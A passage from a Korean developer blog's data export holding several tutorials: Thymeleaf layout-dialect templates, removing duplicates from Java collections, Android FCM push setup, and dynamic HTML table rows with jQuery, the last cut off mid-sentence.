타임리프에서 코드 재사용을 개선하기 위해 재사용이 가능한 레이아웃과 템플릿을 작성할 수 있도록 도와주는 라이브러리입니다.\n\n이것에 대한 포스팅은 [Thymeleaf에서 thymeleaf-layout-dialect 소개 포스팅](https://elfinlas.github.io/thymeleaf/180217_thymeleaf-layout-dialect/)를 참고해주세요.\n\n<br>\n\n## 예제에 앞서\n\n예제는 제가 오픈소스로 만들고 있는 **CompanyBoard**에서 쓰인 부분입니다.  \n**thymeleaf-layout-dialect**를 사용하여 공통적으로 사용하는 레이아웃을 만들고, 컨텐츠 페이지에 공통 레이아웃을 적용하는 순서로 진행하겠습니다.\n\n<br>\n\n### 1. 공통적으로 사용할 Main Layout 작성\n\nHTML이라면 다음과 같은 기본 양식을 따를 것입니다.\n\n```html\n예제파일 이름 : layout/main_layout.html\n<!DOCTYPE html>\n<html lang=\"ko\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:th=\"http://www.thymeleaf.org\">\n  <head th:replace=\"fragments/main/main_header :: mainHead\"> </head>\n  <body th:replace=\"fragments/main/main_body :: mainBody\"></body>\n</html>\n```\n\nhtml 태그 안에 head와 body가 구성되는데 저의 경우 위 예제처럼 큰 틀의 공통 레이아웃을 잡고, head와 body 영역에서 **th:replace** 속성을 통해 각 부분에 대한 공통 레이아웃을 재정의 하였습니다.\n\n> **th:replace** 속성은 간단하게 설명하면 해당 속성이 선언된 html 태그를 replace에 정의된 다른 html 파일로 치환하는 것으로 jsp의 include와 비슷한 동작을 행합니다.\n\n> **th:replace** 속성의 경로는 Spring-boot의 기본 경로인 **templates** 하위에 정의한 경로를 작성 후 :: 뒤에는 아래에서 소개할 **fragment**속성의 이름을 적어줍니다.\n\n<br>\n\n### 2. Head의 공통 부분 작성\n\nhead의 공통 부분은 아래의 예제와 같습니다.\n\n```html\n예제파일 이름 : fragments/main/main_header.html\n<!DOCTYPE html>\n<html\n  lang=\"ko\"\n  xmlns=\"http://www.w3.org/1999/xhtml\"\n  xmlns:th=\"http://www.thymeleaf.org\"\n  xmlns:layout=\"http://www.ultraq.net.nz/thymeleaf/layout\"\n>\n  <head th:fragment=\"mainHead\">\n    <th:block th:include=\"fragments/common/c_head\"></th:block>\n\n    <link rel=\"stylesheet\" th:href=\"@{/lib/AdminLTE-2.4.2/css/AdminLTE.min.css}\" />\n    <link rel=\"stylesheet\" th:href=\"@{/lib/AdminLTE-2.4.2/css/skins/_all-skins.css}\" />\n\n    <link rel=\"stylesheet\" th:href=\"@{/css/common/common_main.css}\" />\n\n    //Custom or page css\n    <th:block layout:fragment=\"custom_css\"></th:block>\n  </head>\n</html>\n```\n\nhead 태그에서 보면 **fragment** 속성에 이름을 정의하였고, **th:include**속성과 css 선언, 그리고 컨텐츠 페이지에서 사용할 영역인 <b>layout:fragment=\"custom_css\"</b>를 정의하였다.\n\n<b>th:include=\"fragments/common/c_head\"</b>속성의 파일은 다음과 같이 구성되어 있다.\n\n```html\n예제파일 이름 : fragments/common/c_head.html //Meta Data\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\n<meta content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\" name=\"viewport\" />\n\n//기본적인 html head 추가부\n<th:block layout:fragment=\"html_head\"></th:block>\n\n//Css lib\n<link rel=\"stylesheet\" th:href=\"@{/lib/AdminLTE-2.4.2/bower_components/bootstrap/dist/css/bootstrap.min.css}\" />\n<link rel=\"stylesheet\" th:href=\"@{/lib/sweetalert2/sweetalert2.min.css}\" />\n<link rel=\"stylesheet\" th:href=\"@{/lib/font-awesome-4.7.0/css/font-awesome.min.css}\" />\n\n//Etc Add on Lib\n<th:block layout:fragment=\"add_lib_css\"></th:block>\n\n//Css custom\n<link rel=\"stylesheet\" th:href=\"@{/css/common/loading.css}\" />\n<link rel=\"stylesheet\" th:href=\"@{/css/common/common_main.css}\" />\n```\n\n<b>layout:fragment=\"html_head\"</b>속성은 컨텐츠 페이지에서 title을 정의하는 부분으로 실제 컨텐츠 페이지에서 알맞게 사용하며, 4번 컨텐츠 페이지 내용을 참고하세요.\n중간의 <b>add_lib_css</b> 영역은 컨텐츠 페이지에서 따로 추가적으로 사용할 css 등을 추가하는 영역입니다.\n\n> 간략히 정리를 하자면 **layout:fragment** 속성은 공통 레이아웃에서 선언하여 실제 컨텐츠 페이지에서 선언된 내용을 채우게 해줍니다.\n\n<br>\n\n### 3. Body의 공통 부분 작성\n\n1번에서 작성한 코드에서 body 영역을 보겠습니다.\n\n```html\n예제파일 이름 : fragments/main/main_body.html\n<!DOCTYPE html>\n<html\n  lang=\"ko\"\n  xmlns=\"http://www.w3.org/1999/xhtml\"\n  xmlns:th=\"http://www.thymeleaf.org\"\n  xmlns:layout=\"http://www.ultraq.net.nz/thymeleaf/layout\"\n>\n  <body th:fragment=\"mainBody\">\n    <div class=\"wrapper\">\n      <th:block layout:fragment=\"content_body\"></th:block>\n      <th:block th:include=\"fragments/main/main_footer\"></th:block>\n    </div>\n\n    <th:block th:include=\"fragments/common/c_body_script\"></th:block>\n\n    <script th:src=\"@{/lib/AdminLTE-2.4.2/js/adminlte.min.js}\"></script>\n    <script th:src=\"@{/js/common/common_main.js}\"></script>\n\n    <th:block layout:fragment=\"custom_js\"></th:block>\n  </body>\n</html>\n```\n\nbody 영역은 싫제 컨텐츠 페이지를 채울 영역인 <b>layout:fragment=\"content_body\"</b>이 선언되어 있고, 공통적으로 사용할 footer를 include 하게 됩니다.\n\n아래의 영역은 JS를 선언하여 사용하는 영역입니다.\n\n<br>\n\n### 4. 컨텐츠 페이지 작성\n\n```html\n<!DOCTYPE html>\n<html\n  lang=\"ko\"\n  xmlns=\"http://www.w3.org/1999/xhtml\"\n  xmlns:th=\"http://www.thymeleaf.org\"\n  xmlns:layout=\"http://www.ultraq.net.nz/thymeleaf/layout\"\n  layout:decorator=\"layout/main_layout\"\n>\n  <th:block layout:fragment=\"html_head\">\n    <title>TachyonTech Info</title>\n  </th:block>\n\n  <th:block layout:fragment=\"add_lib_css\">\n    <link rel=\"stylesheet\" th:href=\"@{/lib/fullcalendar-3.6.2/fullcalendar.min.css}\" />\n    <link rel=\"stylesheet\" th:href=\"@{/lib/fullcalendar-3.6.2/fullcalendar.print.min.css}\" media=\"print\" />\n  </th:block>\n\n  <th:block layout:fragment=\"custom_css\">\n    <link rel=\"stylesheet\" th:href=\"@{/css/dashboard/main.css}\" />\n  </th:block>\n\n  <th:block layout:fragment=\"content_body\">\n    <div th:replace=\"fragments/common/loading\"></div>\n    <header th:include=\"fragments/main/main_sidemenu\"></header>\n\n    <div class=\"content-wrapper\">//..... 실제 컨텐츠 내용 작성</div>\n  </th:block>\n\n  <th:block layout:fragment=\"custom_js\">\n    <script th:src=\"@{/lib/fullcalendar-3.6.2/fullcalendar.min.js}\"></script>\n\n    <script th:src=\"@{/js/dashboard/main.js}\"></script>\n  </th:block>\n</html>\n```\n\n컨텐츠 페이지는 위의 예제를 참고하시면 됩니다.  \n처음 보면 약간은 복잡하지만, 위의 예제를 하나씩 흐름에 맞춰서 보게 되면 그리 어렵지도 않습니다.  \n그리고 이해 후 사용하게 되면 레이아웃에 대한 공통적인 부분을 쉽게 구현할 수 있으며, 코드 복잡도도 낮아지게 됩니다.\n\n<br>\n\n## 결론\n\n위의 예제를 약간 정리하면 다음과 같습니다.\n\n- 상위 공통 레이아웃 -> layout/main_layout.html\n- head 공통 레이아웃 -> fragments/main/main_header.html -> fragments/common/c_head.html\n- body 공통 레이아웃 -> fragments/main/main_body.html\n- 위의 공통 레이아웃들을 묶어서 컨텐츠 페이지 작성\n\n포스팅의 내용이 약간 길게 되어 제가 자세하게 적지 못한 부분도 있을 수 있습니다.  \n이해가 안되시거나 잘못된 부분이 있다면 메일 등으로 알려주시면 답변 또는 수정 처리하도록 하겠습니다.\n\n감사합니다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2018-02-11) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. 너무 오랜만의 포스팅?? 간만에 작성을 하는 포스팅입니다. 요새 너무 정신없이 바빠져서 포스팅을 할 기회가 없었습니다. 계속 포스팅을 꾸준하게 해야 하지만...노오력을 해야 겠네요 ㅠ 근황은 근화이고 포스팅…","fields":{"slug":"/java/180211_javacollectionduplicate/"},"frontmatter":{"date":"February 11, 2018","title":"Java에서 컬렉션의 중복을 제거하는 방법","description":null,"tags":["Java"],"series":"Java","previewImage":"java_logo.webp","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2018-02-11) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n# 너무 오랜만의 포스팅??\n\n간만에 작성을 하는 포스팅입니다.\n\n요새 너무 정신없이 바빠져서 포스팅을 할 기회가 없었습니다.\n\n계속 포스팅을 꾸준하게 해야 하지만...노오력을 해야 겠네요 ㅠ\n\n근황은 근화이고 포스팅은 해야겠죠?\n\n# Java에서 컬렉션에서 중복 제거\n\n요새 Java 개발에 빠져서 허우적 중인데 개발을 하다 보면 데이터를 컬렉션에 담아서 처리하는 경우가 많습니다.\n\n그리고 그 컬렉션에 중복된 데이터가 발생하는 문제가 있었는데 이런 문제를 해결하기 위한 방법을 알아보겠습니다.\n\n먼저 예를 위해서 아래의 컬렉션을 사용하도록 하겠습니다.\n\n```java\nList<Integer> intList = Arrays.asList(1,2,3,4,5,5,2,1,5);\nList<String> strList = Arrays.asList(\"abc\", \"222\", \"123\", \"222\", \"123\", \"abc\");\n```\n\n최종 결과는 다음과 같이 나오게 됩니다.\n\n```java\nintList = [1, 2, 3, 4, 5]\nstrList = [222, 123, abc]\n```\n\n<br>\n\n## Step 1. HashSet을 사용하여 중복 제거하기\n\nJava의 컬렉션 중 **Set** 컬렉션 중 하나인 **HashSet**을 통해서 제거하는 방법입니다.\n\n```java\nList result1 = new ArrayList(new HashSet(intList));\nList result2 = new ArrayList(new HashSet(strList));\n```\n\n중복된 컬렉션을 **HashSet**에 넣게 되면 **Set** 컬렉션 특성 상 중복된 자료는 제거됩니다.  \n이렇게 중복된 결과를 다시 **ArrayList**로 넣게 되면 중복된 자료는 사라지게 됩니다.\n\n하지만 이 방법은 썩 좋은 방법은 아닌 것 같습니다.  \n기존 중복된 자료형을 HashSet으로 변경 후 다시 ArrayList로 변경하는 것은 부담이 됩니다.\n\n<br>\n\n## Step 2. Java8의 Stream을 사용하기\n\nJava8은 7과 비교하여 다양한 것이 추가되고 변경이 되었습니다.  \n이 중 **Stream**의 **distinct()** 메서드를 활용하여 중복을 제거할 수 있게 되었습니다.\n\n```java\nList result1 = intList.stream().distinct().collect(Collectors.toList());\nList result2 = strList.stream().distinct().collect(Collectors.toList());\n```\n\n**stream**의 **distinct()**를 사용하게 되면 중복된 값을 제거하게 됩니다.  \n그리고 **collect()**를 통해 List로 반환하게 되면 아주 깔끔하게 처리할 수 있게 됩니다.\n\n<br>\n\n# 결론...Java8!\n\n개인적으로 **Step2** 방법으로 컬렉션의 중복자료를 제거하는 방법을 사용하는게 좋은 것 같습니다.\n\n이런 비슷한 고민을 하시는 분들에게 좋은 자료가 되었으면 합니다.  \n요새 오픈소스 및 회사 업무를 진행하느라 바쁘지만...꾸준히 포스팅을 다시 해보도록 하겠습니다!\n\n추운데 감기 조심하시고, 방문해주셔서 감사합니다!\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-12-25) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. Android에서 푸시 알림을 구현하려면? 전에 하던 프로젝트에서 안드로이드와 서버간의 푸시 알림을 구현하였습니다. 이걸 한번 정리해서 문서화 해야 했지만 시간이 없어서 정리를 못하다가 이번 기회를 통해 포…","fields":{"slug":"/android/171225_android_fcm/"},"frontmatter":{"date":"December 25, 2017","title":"Android에서 FCM 푸시 사용하기","description":"FCM 사용하기","tags":["FCM","Android"],"series":"Android","previewImage":"android_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-12-25) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n# Android에서 푸시 알림을 구현하려면?\n\n전에 하던 프로젝트에서 안드로이드와 서버간의 푸시 알림을 구현하였습니다.  \n이걸 한번 정리해서 문서화 해야 했지만 시간이 없어서 정리를 못하다가 이번 기회를 통해 포스팅을 하여 정리하려 합니다.\n\n<br>\n\n![](/img_01.png)\n\n위 이미지는 FCM 사이트에서 가져온 것인데, 이미지에서 보는 것처럼 푸시 서비스를 구현하려면 **모바일측** 구현과  \n**푸시 메세지를 관리하는 서버 측** 두 가지를 구현해야 합니다. (GUI는 제외하도록 하겠습니다.)\n\n이번 포스팅에서는 FCM을 안드로이드에 적용하는 방법에 대해서 알아보도록 하겠습니다.\n\n<br>\n\n## 안드로이드에서 FCM 설정하기\n\n설정하는 것은 [공식문서](https://firebase.google.com/docs/cloud-messaging/android/client?hl=ko)를 참고하면 되지만, 이 포스팅에서는 핵심만 집어서 정리하도록 하겠습니다.\n\n<br>\n\n### 1. Firebase 프로젝트 만들기\n\nFCM을 적용할 프로젝트에 Firebase 프로젝트를 추가해야 하는데, [콘솔](https://console.firebase.google.com/?hl=ko&pli=1)사이트에서 프로젝트를 추가해야 합니다.  \n프로젝트가 미 추가 상태라면 위 콘솔 사이트에서 생성합니다.\n\n![](/img_02.png)\n\n생성이 완료되면 위 사진처럼 설정 아이콘 클릭 후 프로젝트 설정을 클릭하면 아래 사진처럼 설정 화면으로 이동하게 됩니다.\n\n![](/img_03.png)\n\n<br>\n\n이곳에서 **Android 앱에 Firebase 추가**를 클릭하면 앱 등록 화면이 뜹니다.\n\n|     앱 등록      | 구성 파일 다운로드 |\n| :--------------: | :----------------: |\n| ![](/img_04.png) |  ![](/img_05.png)  |\n\n**앱 등록**화면에서는 안드로이드 패키지 이름(build.gradle의 android{ applicationId }에 선언된 것)을 등록 후,  \n다음 화면인 **구성 파일 다운로드**에서 설명에 나온 대로 json 파일을 프로젝트에 추가합니다.\n\n이후는 아래의 사진처럼 작업을 진행합니다.\n\n![](/img_06.png)\n\n<br>\n\n### 2. Dependencies 설정하기\n\n아래의 의존성을 추가해줍니다.\n\n```gradle\ndependencies {\n\t...\n\tompile 'com.google.firebase:firebase-messaging:11.0.4'\n}\n```\n\n<br>\n\n### 4. FCM 처리를 위한 서비스 클래스 작성\n\nAndroid Studio에서 서비스를 구현할 클래스를 만들어줍니다.\n\n![](/img_07.png)\n\n위 사진은 그냥 참고용이며, 저 같은 경우 패키지를 하나 만들고 그곳에 생성하였습니다.  \n2개의 클래스를 생성해야 하는데, **FirebaseMessagingService**를 상속받은 클래스와 **FirebaseInstanceIdService**를 상속받은 클래스를 만들어줍니다.\n\n아래는 예시로 만든 클래스들입니다.\n먼저 **FirebaseMessagingService**을 상속받은 클래스를 하나 만들어줍니다.\n\n```java\nimport android.app.NotificationManager;\nimport android.app.PendingIntent;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.graphics.Color;\nimport android.media.RingtoneManager;\nimport android.net.Uri;\nimport android.os.PowerManager;\nimport android.support.v4.app.NotificationCompat;\n\nimport com.google.firebase.messaging.FirebaseMessagingService;\nimport com.google.firebase.messaging.RemoteMessage;\n\nimport java.util.Date;\nimport java.util.Map;\n\npublic class CustomFirebaseMessagingService extends FirebaseMessagingService {\n\n    /**\n     * Called when message is received.\n     *\n     * @param remoteMessage Object representing the message received from Firebase Cloud Messaging.\n     */\n    // [START receive_message]\n    @Override\n    public void onMessageReceived(RemoteMessage remoteMessage) {\n        Map<String, String> pushDataMap = remoteMessage.getData();\n        sendNotification(pushDataMap);\n    }\n\n    private void sendNotification(Map<String, String> dataMap) {\n        Intent intent = new Intent(this, MachineListActivity.class);\n        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);\n\n        PendingIntent contentIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_ONE_SHOT);\n        Uri defaultSoundUri= RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);\n\n        NotificationCompat.Builder nBuilder = new NotificationCompat.Builder(this)\n                .setSmallIcon(R.mipmap.ic_launcher)\n                .setContentTitle(dataMap.get(\"title\"))\n                .setContentText(dataMap.get(\"msg\"))\n                .setAutoCancel(true)\n                .setSound(defaultSoundUri)\n                .setVibrate(new long[]{1000, 1000})\n                .setLights(Color.WHITE,1500,1500)\n                .setContentIntent(contentIntent);\n\n        NotificationManager nManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);\n        nManager.notify(0 /* ID of notification */, nBuilder.build());\n    }\n```\n\n이 서비스 클래스는 푸시 메세지를 받아서 처리하는 것을 구현합니다.  \n**onMessageReceived** 메서드에서는 푸시 메세지를 수신했을 때 호출이 되며, **pushDataMap**에는 푸시 메세지 내용이 담기게 됩니다.  \n**sendNotification** 메서드는 푸시 메세지를 알림으로 표현하는 처리를 담당하게 됩니다.  \n해당 메서드는 자신의 로직에 맞게끔 구현하면 되며, 위는 예로 구현을 한 것입니다.\n\n다음은 **FirebaseInstanceIdService**를 상속받은 클래스 예시입니다.\n\n```java\nimport com.google.firebase.iid.FirebaseInstanceId;\nimport com.google.firebase.iid.FirebaseInstanceIdService;\n\npublic class CustomFirebaseInstanceIdService extends FirebaseInstanceIdService {\n\n    /**\n     * Called if InstanceID token is updated. This may occur if the security of\n     * the previous token had been compromised. Note that this is called when the InstanceID token\n     * is initially generated so this is where you would retrieve the token.\n     */\n    // [START refresh_token]\n    @Override\n    public void onTokenRefresh() {\n        String refreshedToken = FirebaseInstanceId.getInstance().getToken();\n        sendRegistrationToServer(refreshedToken);\n    }\n    // [END refresh_token]\n\n\n    /**\n     * Persist token to third-party servers.\n     *\n     * Modify this method to associate the user's FCM InstanceID token with any server-side account\n     * maintained by your application.\n     *\n     * @param token The new token.\n     */\n    private void sendRegistrationToServer(String token) {\n\t\t//FCM 토큰 갱신\n    }\n}\n```\n\n이 클래스는 어플리케이션이 처음 설치되거나 가끔 토큰이 갱신될 때 **onTokenRefresh** 메서드를 통해 FCM Token을 하나 생성이 되어집니다.  \n그리고 이 토큰이 생성되거나 갱신된 경우 서버에 보내주는 메서드인 **sendRegistrationToServer**를 호출하게 됩니다.\n\n이 FCM 토큰을 통해 해당 기기로 서버에서 푸시 메세지를 보내게 해주는 고유 값입니다.  \n이 부분은 향후에 서버 측 구현 시 FCM 토큰이 갱신되는 부분을 개발해야 합니다.\n\n> 사실 다른 블로그들에서는 여기까지만 대부분 설명을 하게 됩니다.  \n> 그런데 사실 이런 정보를 찾으시는 분들은 요구사항에 맞는 내용을 구현하기 위해 내용을 찾게 됩니다.  \n> 전부 다 커버할 수는 없지만 두 가지 예시 사항을 보고 어떤식으로 로직을 풀어나가야 할지를 알아보겠습니다.\n\n#### 알림 수신 여부\n\n예를 들어 알림 수신 시간을 제한하는 기능을 구현해야 한다고 해봅시다.  \n그럼 아래와 같은 로직을 생각해 볼 수 있겠습니다.\n\n1. 사용자로부터 알림 수신을 제외할 시간을 입력받습니다.\n2. 1번의 데이터를 Sharedpreference 등에 저장을 해둡니다.\n3. **FirebaseMessagingService**를 구현한 클래스의 **onMessageReceived**메서드에서 푸시 알림 수신을 하였을 때 2번의 저장된 데이터를 읽어와서 해당 시간이 푸시 알림이 가능할 경우에만 **sendNotification()** 메서드를 호출.\n\n저 같은 경우 아래와 같은 메서드를 하나 만들고 로직을 구현하였습니다.\n\n```java\nprivate boolean isCanReceivePush(String pushMsg) {\n\t//시간 체크 로직\n}\n```\n\n그래서 **onMessageReceived** 메서드에서 저 메서드를 호출하여 true 값을 받을 경우에만 메세지를 수신하는 처리를 하였습니다.\n\n<br>\n\n#### 토큰 생성 및 갱신 부분\n\n위에서 설명드린 것처럼 어플리케이션을 처음 설치할 때나 FCM 토큰을 갱신할 경우엔 Sharedpreference에 토큰 값을 저장해두는 게 좋습니다.  \n그래서 **onTokenRefresh()** 메서드에서 호출 시 아래와 같이 응용할 수 있습니다.\n\n```java\n@Override\n    public void onTokenRefresh() {\n        String refreshedToken = FirebaseInstanceId.getInstance().getToken();\n\n        if (isValidString(refreshedToken)) { //토큰이 널이거나 빈 문자열이 아닌 경우\n            if (!isValidString(getSharedPreferencesStringData(getApplicationContext(), AD_FCM_TOKEN))) { //토큰에 데이터가 없는 경우에만 저장\n                setSharedPreferencesStringData(getApplicationContext(), AD_FCM_TOKEN, refreshedToken);\n            }\n\n            if (isValidString(getSharedPreferencesStringData(getApplicationContext(), AD_LOGIN_ID))) { //로그인 상태일 경우에는 서버로 보낸다.\n                if (!refreshedToken.equals(getSharedPreferencesStringData(getApplicationContext(), AD_FCM_TOKEN))) { //기존에 저장된 토큰과 비교하여 다를 경우에만 서버 업데이트\n                    setSharedPreferencesStringData(getApplicationContext(), AD_FCM_TOKEN, refreshedToken);\n                    sendRegistrationToServer(refreshedToken);\n                }\n            }\n        }\n    }\n```\n\n제가 개발했던 구형 로직을 그대로 가져와서 약간 지저분해 보일 수 있습니다만 일단 참고 및 설명용임을 감안해주시기 바랍니다.  \n일단 저 같은 경우 아래의 로직으로 구현하였습니다.\n\n1. 갱신된 토큰이 정상인지 체크\n2. Sharedpreference에 저장된 FCM 토큰 값이 없는 경우에만 저장.\n3. 만약 로그인 상태일 경우 Sharedpreference에 갱신된 토큰을 저장하고 서버로 갱신된 토큰을 전송하는 메서드를 호출.\n\n> 간단하게 두 가지의 예시만 설명을 드렸습니다.  \n> 다른 요구사항이 있다면 위에서 안내드린 것처럼 로직을 풀어보고 그에 맞춰서 구현을 하면 푸시는 어렵지 않게 구현을 하실 수 있습니다.\n\n<br>\n\n### 5. Manifest 파일 수정\n\n위에서 생성한 서비스 클래스를 매니페스트에 등록합니다.\n\n```xml\n\t\t<!-- Firebase Service -->\n\t\t<service\n\t\t\tandroid:name=\".firebase.CustomFirebaseMessagingService\"\n\t\t\tandroid:enabled=\"true\"\n\t\t\tandroid:exported=\"true\">\n\t\t\t\t<intent-filter>\n\t\t\t\t\t<action android:name=\"com.google.firebase.MESSAGING_EVENT\"/>\n\t\t\t\t</intent-filter>\n\t\t</service>\n\n\t\t<service\n           android:name=\".firebase.CustomFirebaseInstanceIdService\"\n           android:enabled=\"true\"\n           android:exported=\"true\">\n           \t<intent-filter>\n\t\t\t\t\t<action android:name=\"com.google.firebase.INSTANCE_ID_EVENT\"/>\n             </intent-filter>\n       </service>\n```\n\n위 작업을 다 마칠 경우 푸시를 수신할 수 있게 됩니다.\n\n<br>\n\n## 정리\n\n사실 이 포스트 하나만으로는 푸시 서비스를 구현했다 할 수 없습니다.  \n개인적으로 푸시 서비스를 구현하려면 **서버 측**의 구현이 제일 중요한 것 같습니다.  \n이 포스트와 짝을 이룰 서버 측 구현 포스팅은 곧 작성하여 업데이트 하도록 하겠습니다.  \n또한 1:1 푸시 말고 구독 값을 이용하여 푸시를 받는 내용도 포스팅할 예정입니다.\n\n업데이트를 기다려주세요.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-12-25) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  HTML에서 Table 요소 처리 이번에 제가 만드는 사내정보시스템을 이번에 저희 회사에도 도입을 하게 되면서, 회사에 특화된 기능을 개발하게 되었습니다. 그런데 이번에 Html의 테이블 요소를 다루게 되…","fields":{"slug":"/til/171225_devnote/"},"frontmatter":{"date":"December 25, 2017","title":"<개발일지> 12월 18일 TIL (HTML Table의 행을 동적으로 처리하기 with jQuery)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-12-25) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_til.png)\n\n<br>\n\n# HTML에서 Table 요소 처리\n\n이번에 제가 만드는 사내정보시스템을 이번에 저희 회사에도 도입을 하게 되면서, 회사에 특화된 기능을 개발하게 되었습니다.\n\n그런데 이번에 Html의 테이블 요소를 다루게 되면서 생긴 문제점과 해결 방안에 대해서 포스팅을 해보려 합니다.\n\n프로젝트를 진행한 환경은 Spring Boot의 **Thymeleaf** 템플릿 엔진을 사용하였으며, 코드 전체는 공개가 불가하여, 일부만 공개합니다.\n\n또한 테이블 요소를 처리하기 위하여 **jQuery v3.2.1**를 사용하였습니다.\n\n<br>\n\n## 어떤 문제점이 있었는가?\n\n구현을 하고 싶은 기능은 다음과 같았습니다.\n\n- 테이블의 행을 동적으로 추가 또는 삭제하기\n- 서버로 데이터 전송 시 입력된 테이블의 행 데이터 모두 가져오기\n\n사실 첫 번째 기능은 검색하면 많이 찾아 볼 수 있는 기능이지만, 두 번째 기능은 찾기 어려웠습니다.  \n그래서 이번 포스팅에서는 저 두 가지를 해결한 방법을 공유하고자 합니다.\n\n<br>\n\n## Table의 행을 동적으로 처리하기\n\n제가 구현하려는 최종 목적은 Table의 행 요소를 제 마음대로 제어하는게 목표입니다.  \n행을 동적으로 한 행씩 추가를 하고, 추가된 행을 하나씩 삭제하는 것입니다.  \n먼저 기본적으로 구현할 화면은 아래와 같습니다.\n\n![](/img_01.png)\n\n**기계 추가**라는 버튼을 터치하면 행이 하나씩 추가가 되고, <b>-</b> 버튼을 터치하면 해당 행을 삭제하는 기능을 가졌습니다.\n\n먼저 테이블을 정의하는 HTML 코드를 보겠습니다.\n\n```html\n<table id=\"factory_table\" class=\"table\" style=\"margin-top: 20px;\">\n  <colgroup>\n    <col width=\"20%\" />\n    <col width=\"10%\" />\n    <col width=\"30%\" />\n    <col width=\"30%\" />\n    <col width=\"10%\" />\n  </colgroup>\n\n  <thead>\n    <tr>\n      <th>이름(설비)</th>\n      <th>대수</th>\n      <th>기계 및 컨트롤러 정보</th>\n      <th>공정명</th>\n      <th></th>\n    </tr>\n  </thead>\n\n  <tbody id=\"factory_tbody\">\n    <tr>\n      <td><input type=\"text\" class=\"form-control\" placeholder=\"설비명\" /></td>\n      <td>\n        <input\n          type=\"number\"\n          class=\"form-control\"\n          placeholder=\"설치 대수\"\n          onkeypress=\"return event.charCode >= 48 && event.charCode <= 57\"\n        />\n      </td>\n      <td>\n        <input\n          type=\"text\"\n          class=\"form-control\"\n          placeholder=\"기계 및 컨트롤러 정보\"\n        />\n      </td>\n      <td><input type=\"text\" class=\"form-control\" placeholder=\"공정명\" /></td>\n      <td></td>\n    </tr>\n  </tbody>\n</table>\n```\n\n> 설치 대수의 onkeypress 이벤트는 특정 브라우저에서 input의 number타입이 사용이 안될 때를 처리하기 위함입니다.  \n> 보통은 number만 적용해도 됩니다.\n\n테이블에 행을 추가하는 방법, 그리고 행을 삭제하는 방법에 대해 알아보도록 하겠습니다.\n\n<br>\n\n### Table 행 추가하기\n\n테이블을 추가하는 버튼을 하나 만들고 행을 추가하는 함수를 만들었다는 가정 하에 추가하는 기능에 대해 집중하여 설명하도록 하겠습니다.\n\n```javascript\nvar rowItem = \"<tr>\"\nrowItem +=\n  \"<td> <input type='text' class='form-control' placeholder='설비명'> </td>\"\nrowItem +=\n  \"<td> <input type='number' class='form-control' placeholder='설치 대수' onkeypress='return event.charCode >= 48 && event.charCode <= 57'> </td>\"\nrowItem +=\n  \"<td> <input type='email' class='form-control' placeholder='기계 및 컨트롤러 정보'> </td>\"\nrowItem +=\n  \"<td> <input type='text' class='form-control' placeholder='공정명'> </td>\"\nrowItem +=\n  \"<td> <button type='button' class='btn btn-danger'> <i class='fa fa-minus'></i> </button> </td>\"\nrowItem += \"</tr>\"\n$(\"#factory_table\").append(rowItem)\n```\n\n사실 추가하는 기능은 어렵지 않습니다.  \n아이템을 추가할 행을 하나 만들어주고, 기존의 행과 동일한 양식으로 만들어 줍니다.  \n그리고 마지막 jQuery에서 html 테이블의 요소에 **append**를 이용하여 행을 추가해 줍니다.\n\n<br>\n\n### Table 행 삭제하기\n\n테이블을 삭제하는 방법도 어렵지 않습니다.\n\n```javascript\n$(\"#factory_table\").on(\"click\", \"button\", function () {\n  $(this).closest(\"tr\").remove()\n})\n```\n\njQuery를 활용하여 동적으로 추가한 행에서 삭제 버튼을 호출하게 되면 어렵지 않습니다.\n\n<br>\n\n### 입력된 Table 행 데이터 가져오기\n\n아래의 코드를 보면서 설명하겠습니다.\n\n```javascript\n$(\"#factory_tbody tr\").each(function () {\n  var cellItem = $(this).find(\":input\")\n  var itemObj = new Object()\n  itemObj.title = cellItem.eq(0).val()\n  itemObj.count = cellItem.eq(1).val()\n  itemObj.info = cellItem.eq(2).val()\n  itemObj.name = cellItem.eq(3).val()\n})\n```\n\n먼저 jQuery 선택자로 해당 테이블, 그리고 각 행을 배열로 가져오고 순차로 조회합니다.\n\n`var cellItem = $(this).find(\":input\")`\n\n행에서는 현재 조회한 행에서 input을 찾아서 가져옵니다.  \n예제에서는 input은 총 4개를 가지고 있습니다.  \n따라서 위 예제에서 처럼 각 요소에 접근을 할 때는 아래와 같이 접근합니다.\n\n`cellItem.eq(인덱스).val()`\n\n여기서 인덱스는 input이 저장된 갯수를 의미합니다.\n\n## 정리\n\n위에서 소개한 세 가지의 기능을 활용한다면, Html 테이블의 행을 동적으로 생성 또는 삭제,  \n그리고 기본 행과 더불어 동적 생성된 행의 입력된 데이터를 가져와서 알아보는 방법에 대해서 알아보았습니다.\n\n행 데이터를 가져오는 기능을 활용한다면, 서버로 